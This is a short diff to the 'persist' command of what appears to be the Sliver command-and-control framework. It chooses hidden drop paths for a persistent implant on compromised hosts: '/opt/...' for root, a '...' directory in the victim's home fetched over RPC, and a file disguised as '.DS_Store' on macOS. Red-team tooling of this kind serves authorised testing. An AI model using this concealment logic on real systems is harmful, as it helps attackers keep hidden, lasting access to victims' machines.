@@ -111,7 +111,26 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 					path = homedrive + path + ":" + sliver + ".exe"
 				}
 			case "linux":
-				path = "/var/tmp/..."
+				if session.Username == "root" {
+					path = "/opt/..."
+				} else {
+					// $HOME Variable expansion
+					resp, err := rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
+						Name:    "HOME",
+						Request: ActiveSession.Request(ctx),
+					})
+					if err != nil {
+						fmt.Printf(Warn+"Error: %v\n", err)
+						return
+					}
+					if len(resp.Variables) == 1 {
+						path = resp.Variables[0].Value
+					} else {
+						// If $HOME isn't set we assume the dir is: /home/$USER
+						path = "/home/" + session.Username
+					}
+					path += "/..."
+				}
 			case "darwin":
 				path = "/var/tmp/.DS_Store"
 			}
@@ -121,6 +140,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		fmt.Printf(Info+"Path: %s\n", path)
 	}
 
+	// Persistence is not Op-Sec Safe
 	if !isUserAnAdult() {
 		return
 	}
